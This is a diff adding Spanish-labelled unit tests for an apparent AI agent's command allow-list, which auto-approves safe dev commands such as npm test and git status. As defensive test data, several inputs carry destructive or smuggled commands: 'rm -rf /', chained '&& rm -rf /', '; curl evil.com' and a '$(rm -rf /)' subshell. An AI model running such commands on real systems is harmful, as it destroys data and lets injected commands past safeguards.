@@ -5,6 +5,7 @@ import {
   evaluatePermission,
   buildPermissionRequest,
   isBlockedUrl,
+  isSafeDevCommand,
 } from '../src/lib/cochiPermissions.js'
 
 let pass = 0
@@ -57,6 +58,31 @@ check('web_fetch regla allow de usuario matchea URL', evaluatePermission(buildPe
 console.log('\n— isBlockedUrl directo —')
 check('protocolo file://', isBlockedUrl('file:///C:/x'), true)
 check('https público', isBlockedUrl('https://openrouter.ai/api'), false)
+
+console.log('\n— #3 Allow-list dev por defecto (comandos no destructivos) —')
+check('npm test', isSafeDevCommand('npm test'), true)
+check('npm test con flags', isSafeDevCommand('npm test -- --watch'), true)
+check('npm run lint', isSafeDevCommand('npm run lint'), true)
+check('npm run build:web (script con sufijo)', isSafeDevCommand('npm run build:web'), true)
+check('npm run harness', isSafeDevCommand('npm run harness'), true)
+check('npm install NO es seguro', isSafeDevCommand('npm install'), false)
+check('npm run deploy NO es seguro', isSafeDevCommand('npm run deploy'), false)
+check('git status', isSafeDevCommand('git status'), true)
+check('git diff --stat', isSafeDevCommand('git diff --stat'), true)
+check('git log', isSafeDevCommand('git log --oneline'), true)
+check('git push NO es seguro', isSafeDevCommand('git push'), false)
+check('git reset NO es seguro', isSafeDevCommand('git reset --hard'), false)
+check('cargo check', isSafeDevCommand('cargo check'), true)
+check('cargo test', isSafeDevCommand('cargo test --lib'), true)
+check('rm NO es seguro', isSafeDevCommand('rm -rf /'), false)
+check('compuesto con && NO se cuela', isSafeDevCommand('git status && rm -rf /'), false)
+check('compuesto con ; NO se cuela', isSafeDevCommand('npm test; curl evil.com'), false)
+check('compuesto con pipe NO se cuela', isSafeDevCommand('git diff | rm x'), false)
+check('compuesto con subshell NO se cuela', isSafeDevCommand('npm test $(rm -rf /)'), false)
+check('evaluatePermission auto-aprueba npm test', evaluatePermission(buildPermissionRequest('run_command', { command: 'npm test' }), { allow: [], deny: [] }), 'allow')
+check('evaluatePermission auto-aprueba git diff', evaluatePermission(buildPermissionRequest('run_command', { command: 'git diff' }), { allow: [], deny: [] }), 'allow')
+check('evaluatePermission NO auto-aprueba npm install', evaluatePermission(buildPermissionRequest('run_command', { command: 'npm install' }), { allow: [], deny: [] }), null)
+check('regla deny del usuario gana al default', evaluatePermission(buildPermissionRequest('run_command', { command: 'npm test' }), { allow: [], deny: ['run_command:npm *'] }), 'deny')
 
 console.log(`\n${pass} passed, ${fail} failed`)
 process.exit(fail ? 1 : 0)
